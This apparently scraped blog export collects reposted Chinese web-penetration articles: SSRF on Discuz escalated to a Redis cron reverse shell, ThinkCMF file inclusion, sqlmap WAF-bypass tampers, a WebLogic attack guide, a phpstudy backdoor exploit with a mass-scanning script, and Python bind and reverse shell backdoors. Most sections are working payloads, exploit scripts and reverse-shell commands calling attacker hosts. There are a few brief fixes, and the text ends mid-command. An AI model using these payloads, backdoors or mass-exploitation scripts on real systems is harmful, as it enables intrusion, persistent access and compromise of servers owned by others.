内网服务探测 网络服务探测 ShellShock命令执行 JBOSS远程Invoker war命令执行 Java调试接口命令执行 axis2-admin部署Server命令执行 Jenkins Scripts接口命令执行 Confluence SSRF Struts2一堆命令执行 counchdb WEB API远程命令执行 mongodb SSRF docker API远程命令执行 php_fpm/fastcgi 命令执行 tomcat命令执行 Elasticsearch引擎Groovy脚本命令执行 WebDav PUT上传任意文件 WebSphere Admin可部署war间接命令执行 Apache Hadoop远程命令执行 zentoPMS远程命令执行 HFS远程命令执行 glassfish任意文件读取和war文件部署间接命令执行 攻击影响获得最大化必须得GET SHELL，通过dict/gopher协议来操作Redis写反弹SHELL是目前最方便的姿势。 使用SSRF操作Redis实战利用@Jannock发现的Discuz中一处SSRF，即可GET SHELL。 也就是说只要你使用了Discuz论坛，那么就可以直接GET SHELL。 漏洞影响只要有一处SSRF（此处用Discuz举例），既可能造成GET SHELL，获取服务器所有权限。 Discuz的一处SSRFDiscuz代码中存在一处远程下载图片的action 123456# source/module/forum/forum_ajax.phpif(preg_match('/^(http:\\/\\/|\\.)/i', $imageurl)) { $content = dfsockopen($imageurl);} elseif(preg_match('/^('.preg_quote(getglobal('setting/attachurl'), '/').')/i', $imageurl)) { $imagereplace['newimageurl'][] = $value[0];} 如果$imageurl是http开头的，则使用dfsockopen远程访问该链接的图片。 那么就可以通过301跳转到一个内网服务上，用来探测内网信息。 构造探测图片通过构造一个远程的伪图片，目的是为了绕过Discuz对入参的检测要求。 1http://feei.cn/301.php 301.php 1234567&lt;?php $ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt; 构造一个跳转到dict://10.11.2.220:6379/vulture.jpg的地址，如下： 1http://feei.cn/301.php?s=dict&amp;ip=10.11.2.220&amp;port=6379&amp;data=vulture.jpg 我们让其301到一个内网ip的6379端口，然后根据整个请求完成的时间不同来判定该服务是否存在（时间在1s以内说明存在，超过超时时间的则目标服务不存在），构造链接如下 123http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.220%26port=6379%26data=vulture.jpg[/img]http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.221%26port=6379%26data=vulture.jpg[/img] 上面链接请求10.11.2.220的80服务只需要100ms，10.11.2.221不存在80服务，返回使用了6s GETSHELL通过dict或者gopher都能操作Redis。 @猪猪侠在wooyun上公布的脚本使用的是dict协议，但经过测试并不能写入正确的cron。 我这里使用的是gopher，不需要像dict协议那样多步构造(flushall/set key/set directory/set dbfilename/save)，只需要一个请求就可以GET SHELL。 1gopher://{redis_server}:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/{your_server}/{your_server_listen_port}%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a 只需要让我们的301.php跳到上面地址，即可写入定时任务(cron)，得到反弹SHELL。 其它利用姿势 除了写cron拿到SHELL，还有还几种姿势。 修复方案大部分请求外部资源底层都是基于curl，curl默认支持的协议比较多。 所以只需要通过配置curl禁止使用除http/https以外其它协议即可解决该问题 1source/function/function_filesock.php 在_dfsockopen方法内增加 1curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 验证修复在一台内网服务器(10.11.2.220)上开启一个8080端口 1python -m SimpleHTTPServer 8080 然后访问触发SSRF的地址 1http://bbs.xxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://feei.cn/301.php?s=dict%26ip=10.11.2.220%26port=8080%26data=helo.jpg[/img] 查看是否有请求的回显，没有则说明修复好了 转自https://docs.ioin.in/writeup/wufeifei.com/_ssrf_/index.html","link":"/2020/09/09/web%E6%B8%97%E9%80%8F/SSRF%E5%88%B0GETSHELL/"},{"title":"ThinkCMF框架任意内容包含漏洞","text":"一、背景 ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。** ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。 每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。 官网:http://www.thinkcmf.com 二、影响版本 ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2 三、漏洞危害远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。 四、漏洞挖掘根据index.php中的配置，他的项目路径为application，打开 Portal 下的 Controller 目录，选择一个控制类文件。 发现他的父类为Common\\Controller\\HomebaseController。 在HomeBaseController中加入如下测试代码 ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。 由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。 [http://127.0.0.1/cmfx-master/?a=test_public&amp;arg1=run%20success](http://127.0.0.1/cmfx-master/?a=test_public&amp;arg1=run success) HomeBaseController类中有一些访问权限为public的函数， 重点关注display函数.看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。 然后调用THinkphp Controller 函数的display方法 1234567891011121314151617181920212223/** * 加载模板和页面输出 可以返回输出内容 * @access public * @param string $templateFile 模板文件名 * @param string $charset 模板输出字符集 * @param string $contentType 输出类型 * @param string $content 模板输出内容 * @return mixed */ public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') { parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix); } 再往下就是调用Think View的fetch方法，这里的TMPL_ENGINE_TYPE 为Think, 最终模版内容解析在ParseTemplateBehavior中完成 如下调用即可加载任意文件 http://127.0.0.1:81/cmfx-master/?a=display&amp;templateFile=README.md 要利用该方法shell,还需要配合前台的一个上传功能，通过包含自己上传的文件来shell，难免有些麻烦。 五、影响范围往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径 最终完美payload (打码) 1http://127.0.0.1:81/cmfx-master/?a=fetch&amp;****=******** 通过在斗象智能安全资产情报搜索关键字，使用ThinkCMF的站点 [https://arl.riskivy.com/products/lighthouse?query=headers:%22X-Powered-By:%20ThinkCMF%22](https://arl.riskivy.com/products/lighthouse?query=headers:&quot;X-Powered-By: ThinkCMF”) 六、修复方法将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符改为 protected 七、自定义后门可通过新建如下控制类 12345678910111213namespace Portal\\Controller;use Think\\Controller;class DoorController extends Controller { public function index($content) { parent::display('', '', '',$content, ''); } } 由于是测试，content未做任何处理，直接传输php代码即可执行。 转载自https://www.freebuf.com/vuls/217586.html 八、漏洞利用payload： 1?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo();?&gt;')&lt;/php&gt; 访问url+payload即可在根目录生成该test.php 访问即可看到探针","link":"/2019/10/24/web%E6%B8%97%E9%80%8F/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"title":"SqlMap-Tamper详解","text":"sqlmap是一款人见人爱的自动化SQL渗透工具，能够以良好的引擎发现给定URL中的可注入处，并自动化的完成注入。但是由于SQL注入的影响过于广泛，致使现代程序的防护越来越严密。sqlmap/tamper是官方给出的一些绕过脚本，可以配合渗透测试人员完成更高效更高质量的测试。** 本文共分为三个部分，第一部分简要对tamper进行介绍，以及为何要使用它，如何使用；第二部分给出当前最新版本（1.2.7-26）的官方sqlmap提供的tamper脚本，第三部分以数据库为区分，给出相应数据库可使用的tamper脚本，以便使用。 Part 1 【为什么】WAF，Web Application Firewall，即网站应用级入侵防御系统，通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护，有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。 为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 【怎么做】当原始注入遇到困难时，可尝试加载相应脚本，进行绕过，说不定会有意外惊喜。在sqlmap的原命令中加入以下代码，即可使用脚本，进行更加强有力的渗透。 --tamper”脚本名称” Part 2 sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\\\\\\\\ 18 greatest 大于号替换为greatest 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/**_**/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp;和|| 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 Part 3 下面以数据库为区分，给出每种数据库可供选择的tamper。若同一脚本适用不同数据库，则在每个数据库中都指出。 【MySQL】 版本 可用tamper编号 脚本名称 4/5.0/5.5 1 0x2char 6 between 9 charencode 16 concat2concatws 18 greatest 24 least 25 lowercase 35 randomcase 39 space2comment 49 space2randomblank 53 uppercase 5.1 7 bluecoat 46 space2mysqlblank 5.0/5.5 12 commalesslimit 13 commalessmid 21 ifnull2casewhenisnull 22 ifnull2ifisnull 42 space2morecomment 5.0 15 concat2concatws 26 modsecurityversioned 27 modsecurityzeroversioned 4.0/5.0 41 space2hash 5.1.56 10 charunicodeencode 5.1.56/5.5.11 32 percentage 56 versionedmorekeywords 4.0.18/5.0.22 19 halfversionedmorekeywords 4.0.18/5.1.56/5.5.11 55 versionedkeywords 5.1.41 43 space2morehash 未指定版本 14 commentbeforeparentheses 40 space2dash 45 space2mssqlhash 47 space2mysqldash 【SQLServer】 版本 可用tamper编号 脚本名称 2005/2000 10 charunicodeencode 32 percentage 44 space2mssqlblank 2005 6 between 9 charencode 16 equaltolike 25 lowercase 35 randomcase 39 space2comment 49 space2randomblank 53 uppercase 2002+ 33 plus2concat 2008+ 34 plus2fnconcat 未指定 14 commentbeforeparentheses 【Access】 版本 可用tamper编号 脚本名称 未指定 4 appendnullbyte 【Oracle】 版本 可用tamper编号 脚本名称 10g 6 between 9 charencode 14 commentbeforeparentheses 18 greatest 24 least 25 lowercase 35 randomcase 39 space2comment 49 space2randomblank 53 uppercase 【PostgreSQL】 版本 可用tamper编号 脚本名称 8.3/8.4/9.0 6 between 9 charencode 18 greatest 24 least 25 lowercase 39 space2comment 49 space2randomblank 53 uppercase 9.0 32 percentage 9.0.3 10 charunicodeencode 未指定 14 commentbeforeparentheses 35 randomcase 【MSSQL】 版本 可用tamper编号 脚本名称 未指定 38 sp_password 【SQLite】 版本 可用tamper编号 脚本名称 未指定 40 space2dash 【未知适用范围】 若以上脚本未解决问题，可尝试使用一下脚本。 版本 可用tamper编号 脚本名称 2 apostrophemask 3 apostrophenullencode 5 base64encode 8 chardoubleencode 11 charunicodeescape 17 escapequotes 20 htmlencode 23 informationschemacomment 28 multiplespaces 29 nonrecursivereplacement 30 overlongutf8 31 overlongutf8more 36 randomcomments 37 securesphere 48 space2plus 50 symboliclogical 51 unionalltounion 52 unmagicquotes 54 varnish 57 xforwardedfor 欢迎收藏，评论，纠正，分享请注明来源。真诚期待各位大佬勘误。 转载自Free-Buf","link":"/2019/10/29/web%E6%B8%97%E9%80%8F/SqlMap-Tamper%E8%AF%A6%E8%A7%A3/"},{"title":"Weblogic渗透测试指南","text":"About WebLogic WebLogic是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器，目前已推出到12c（12.1.1）版。而此产品也延伸出WebLogic Portal, WebLogic Integration等企业用的中间件（但目前Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE（Oracle Enterprise Pack for Eclipse）开发工具。 ———— 引自 wikipedia 类似于一个Tomcat Apche之类的webserver，但是拥有更多集成的开发、集成、部署和管理功能。 常开放于7001/7002端口 漏洞环境来自于vulhub https://github.com/vulhub/vulhub/tree/master/weblogic weak_password 访问/console会转跳到管理员的登录界面 这里提供了两种方法进行进入后台，一个是弱口令，还有就是配合任意文件读取破解密码 弱口令的话没什么技巧可言，但也是实战中比较重要的一种方式，这里账号密码为 l 账号：weblogic l 密码：Oracle@123 配合任意文件读取的话这里提供了一个http://your-ip:7001/hello/file.jsp?path=任意文件读取点，需要读取两个文件（当前目录为/root/Oracle/Middleware/user_projects/domains/base_domain） ./security/SerializedSystemIni.dat 并将获取到的二进制字符保存到文件中 ./config/config.xml获取到node-manager-password-encrypted这个字段下的值 由于加密的算法是基于对称加密的，所以可以破解出原密码（工具在网上也不难找到 这样就可以顺利登录到网站后台了，然后就是部署一个包含自己马的war包（没有jsp马的我默默问大佬要了个马 linux下可以直接用命令打包war包 1 jar -cvf [war**包名] [目录名]** 然后部署war包 访问http://your-ip:7001/web/web/xxx.jsp即可访问到上传的马 SSRF 漏洞产生于/uddiexplorer/SearchPublicRegistries.jsp页面中，可以导致ssrf，用来攻击内网中一些redis和fastcgi之类的脆弱组件 http://192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://localhost:7001 当http端口存活的时候就会显示404not found 随机访问一个端口则会显示could not connect 一个非http的协议则会返回did not have a valid SOAP，不存活的主机就是No route to host 访问redis服务时 攻击内网redis 一个简单的内网扫扫描 import requestsurl =”http://192.168.85.133:7001/uddiexplorer/SearchPublicRegistries.jsp&quot;ports =[6378,6379,22,25,80,8080,8888,8000,7001,7002]for i inrange(1,255):for port in ports: params =dict( rdoSearch =”name”, txtSearchname =”sdf”, selfor =”Business+location”, btnSubmit =”Search”, operator =”http://172.23.0.{}:{}&quot;.format(i,port))try: r = requests.get(url, params=params, timeout =3) except: pass if’could not connect over HTTP to server’ not in r.text and ‘No route to host’ not in r.text:print(‘[*] http://172.23.0.{}:{}'.format(i,port))else: pass#print(‘[-] http://172.23.0.{}:{}'.format(i,port)) 扫描结果 [] http://172.23.0.1:80[] http://172.23.0.1:7001[*] http://172.23.0.2:6379[*] http://172.23.0.3:7001 172.23.0.1是我本地虚拟机，就可以忽略，6379就是很熟悉的redis了 写如定时命令，详细攻击redis可以参考下 https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/ set1”\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.23.0.1/21 0&gt;&amp;1\\n\\n\\n\\n”config set dir /etc/config set dbfilename crontabsave 转换成url格式，然后传输 http://192.168.85.133:7001//uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.23.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20&gt;%26%20%2Fdev%2Ftcp%2F172.23.0.1%2F1234%200&gt;%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 在虚拟机中用nc监听端口 nc -l -p 1234 过一会就能看到反弹回来的shell 业务无需UUDI功能时建议将其关闭 反序列化 CVE-2017-10271 Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 漏洞发生在/wls-wsat/CoordinatorPortType页面中，它会将传入的xml语句进行解析、然后反序列化，造成任意代码执行 构造如下的http包，在sub中传入所需的命令即可命令执行 POST /wls-wsat/CoordinatorPortType HTTP/1.1Host:192.168.85.133:7001User-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/xmlContent-Length: 544Connection: closeUpgrade-Insecure-Requests: 1 /bin/bash-csub 我这由于是在虚拟机中搭建的，就弹了个sublime框 需要注意的是Content-Type要设置成text/xml否则不会解析xml 反序列化 CVE-2018-2628 首先需要一个ysoserial https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 启动一个JRMP Server，[listen port] 为监听的端口 [ommand]为想要执行的命令 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command] 如我这为 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 23333 CommonsCollections1 ‘touch /tmp/evil’ 运行exp python exploit.py [victim ip][victim port][path to ysoserial][JRMPListener ip][JRMPListener port][JRMPClient] l [victim ip]： weblogic ip l [victim port]：weblogic 端口 l [path to ysoserial]：ysoserial地址 l [JRMPListener ip]：JRMP Server的ip l [JRMPListener port]：JRMP Server的端口 l [JRMPClient]：有JRMPClient或JRMPClient2两个选项 python 44553.py 127.0.0.17001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.85.13323333 JRMPClient 然后进入虚拟机内部之后，就可看到tmp目录下生成的evil文件 复现的时候有几个小问题，JRMP Server的ip需要填本地主网卡（用于上网的那个）的ip 然后在物理机上攻击虚拟机中映射出来的docker环境不知道为什么没有成功 以及自己在虚拟机上搭建的weblogic10.3.6貌似也没有成功。。 任意文件上传 CVE-2018-2894 访问/ws_utc/config.do页面可以设置工作目录，将其设置为 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 然后在安全-&gt;添加处上传一个小马 在返回的数据包中有文件的id值 然后访问/ws_utc/css/config/keystore/[id]_[filename]即可访问到文件 这个漏洞有个限制条件就是需要在开发模式下进行，否生产模式时需要进行认证登录 CVE-2018-3191 更新于2018/10/31 听说最近又出了一个危害比较大的漏洞，遂复现了一下。和之前一样，需要weblogic开启T3协议 nmap -n -v -Pn -sV 192.168.85.144–script=weblogic-t3-info.nse 需要一些准备的工具，具体可看这里https://github.com/jas502n/CVE-2018-3191 需要先生成一个payload java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://攻击机ip:端口/exp &gt; payload java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://172.20.0.1:8888/exp &gt; payload 开启一个rmi服务 java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 “要执行的指令” java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 Commonollections1 “bash -c {echo,L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTcyLjIwLjAuMS83Nzc3IDA8JjEgMj4mMQ==}|{base64,-d}|{bash,-i}” 这里将shell弹到了本地的7777端口，用nc监听一下 1 nc -lnvp 7777 发送攻击流量 1 python weblogic.py 172.20.0.2 7001 payload 同时rmi服务会接受到172.20.0.2的流量 成功getshell C#从入门到入土全套教学 https://pan.baidu.com/s/1D3pvm4U1F3IsJfydHz-3hA 提取密码：uq94 来源：kingkk博客","link":"/2020/08/13/web%E6%B8%97%E9%80%8F/Weblogic%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/"},{"title":"php后门复现","text":"0x00 后门分析 存在后门的 phpstudy 版本有 2016、2018。PHP版本：5.2.17、5.4.45，后门代码存在于\\ext\\php_xmlrpc.dll模块中 用户可以通过搜索php_xmlrpc.dll模块中包含“@eval”关键字快速判断是否是存在后门的版本，命令参考： findstr /m /s /c:”@eval” . 0x01复现访问任意php网站即可（html不行） EXP 请求包：主要的是 Accept-Encoding 和 Accept-Charset Accept-Charset 的内容是 base64 加密：system(“net user”); 1234567891011GET / HTTP/1.1Host: 192.168.1.111Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding:gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close 成功执行了命令 0x02 踩坑自己构造请求包怎么也复现不出来、复制别人成功的请求包就可以复现、来看看这几个造成复现不成功的问题吧 复现关键： 1、在于Accept-Encoding:gzip,deflate的逗号中间不能有空格。 2、请求包最后多两个换行。 0x03脚本python脚本1（转自T9Sec） 123456789101112131415161718192021222324252627import requests,base64,sysdef exp(url): try: if 'http' not in url: url = 'http://'+url while True: a = input('$ ') b = 'system(&quot;%s&quot;);' %a c = base64.b64encode(b.encode('utf-8')) payload = (str(c,'utf-8')) headers = { 'Accept-Encoding':'gzip,deflate', 'Accept-Charset':payload } r = requests.get(url=url,headers=headers,timeout=5) r.encoding = r.apparent_encoding print(r.text) except: return 'Error'if __name__ == '__main__': print(exp(sys.argv[1])) 评价：超级不稳定。 批量脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python3#-*- encoding:utf-8 -*-# 卿 博客:https://www.cnblogs.com/-qing-/import base64import requestsimport threadingimport threadpoolprint(&quot;======Phpstudy Backdoor Exploit============\\n&quot;)print(&quot;===========By Qing=================\\n&quot;)print(&quot;=====Blog：https://www.cnblogs.com/-qing-/==\\n&quot;)def write_shell(url): payload = &quot;echo \\&quot;qing\\&quot;;&quot; payload = base64.b64encode(payload.encode('utf-8')) payload = str(payload, 'utf-8') headers = { 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'accept-charset': payload, 'Accept-Encoding': 'gzip,deflate', 'Connection': 'close',} try: r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30) if &quot;qing&quot; in r.text: print ('[ + ] BackDoor successful: '+url+'===============[ + ]\\n') with open('success.txt','a') as f: f.write(url+'\\n') else: print ('[ - ] BackDoor failed: '+url+'[ - ]\\n') except: print ('[ - ] Timeout: '+url+' [ - ]\\n')# url = &quot;http://xxx&quot;# write_shell(url=url,headers=headers)def main(): with open('url.txt','r') as f: lines = f.read().splitlines() task_pool=threadpool.ThreadPool(5) requests=threadpool.makeRequests(write_shell,lines) for req in requests: task_pool.putRequest(req) task_pool.wait() if __name__ == '__main__': main()#线程队列部分# th=[]# th_num=10# for x in range(th_num):# t=threading.Thread(target=write_shell)# th.append(t)# for x in range(th_num):# th[x].start()# for x in range(th_num):# th[x].join() 谷歌语法： “phpstudy” &amp;&amp; server==”nginx” 0x04预防可以从PHP官网下载原始php-5.4.45版本或php-5.2.17版本，替换其中的php_xmlrpc.dll，下载地址： https://windows.php.net/downloads/releases/archives/php-5.2.17-Win32-VC6-x86.zip https://windows.php.net/downloads/releases/archives/php-5.4.45-Win32-VC9-x86.zip","link":"/2019/10/16/web%E6%B8%97%E9%80%8F/php%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"},{"title":"基于python的直连型shell和反射型shell","text":"0x00 前言每次对服务器进行了渗透和提权之后，下一步就该维持权限（留后门），方便我们下次执行命令，留一个后门比起每次重新从webshell进入，一是降低被发现的概率，二是免去繁琐的操作，三是如果web漏洞被修补webshell被查杀，有时候我们放进去隐藏较好的后门并没有被查杀，我们仍然可以控制这台机器。 这里介绍两个可以通过netcat连接的python版shell。 0x01 需要的库 os： os模块提供了非常丰富的方法用来处理文件和目录。 subprocess： subprocess是Python 2.4中新增的一个模块，它允许你生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码。我们这里主要使用subprocess.call()函数，执行指定的命令，并返回命令执行状态。 socket: Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。 optparse： optparse模块用来处理命令行参数，使我们在统一管理时更方便。 0x02 直连型shell先贴代码： 12345678910111213141516#filename:zshell.pyfrom socket import *import subprocessif __name__ == &quot;__main__&quot;: server = socket(AF_INET, SOCK_STREAM) server.bind(('0.0.0.0', 2333)) server.listen(5) print ('waiting for connect') while 1: talk, addr = server.accept() print('connect from', addr) proc = subprocess.Popen([&quot;python -c 'import pty; pty.spawn(\\&quot;/bin/bash\\&quot;)'&quot;], stdin=talk, stdout=talk, stderr=talk, shell=True) 这段代码的作用是，创建一个在2333端口监听任意ip的socket，如果监听到连接，就打开一个/bin/bash进程提供给目标ip执行命令。 我们要使用他时，只需在目标服务器执行 1python zshell.py 然后在我们自己的机器使用netcat输入： 1nc &lt;服务器ip&gt; 2333 就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu： 0x03 反射型shell有时我们并不能直接访问目标服务器，这个时候可以通过反射shell来连接，也就是在我们本机使用netcat创建监听，然后让服务器上主动连接我们：先贴要放在服务器端的代码： 1234567891011121314151617181920212223242526272829303132333435#filename：fshell.pyimport osimport socketimport subprocessimport optparsedef connect_shell(HOST,PORT): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) # 重定向shell输出 os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) # 执行子程序 p = subprocess.call(['/bin/bash', '-i'])def main(): parser = optparse.OptionParser() parser.add_option('-H', dest='HOST', type='string', help=&quot;IP address or Website&quot;) parser.add_option('-p', dest='PORT', type='int', help=&quot;Port num&quot;) (options, args) = parser.parse_args() if(options.HOST==None)|(options.PORT==None): print('---wrong input!---'+'\\n') exit(0) else: HOST = options.HOST PORT = options.PORT while(1): try: connect_shell(HOST,PORT) except: passif __name__ =='__main__': main() 我们在服务端执行此代码，通过命令行参数传入我们本机的ip和监听端口，然后创建向传入的ip和端口的socket连接，再重定向shell之后通过subprocess.call调用/bin/bash来执行命令。 我们要使用它时，首先在本机输入： 1nc -lvp 2333 然后在服务端运行： 1python fshell.py -H 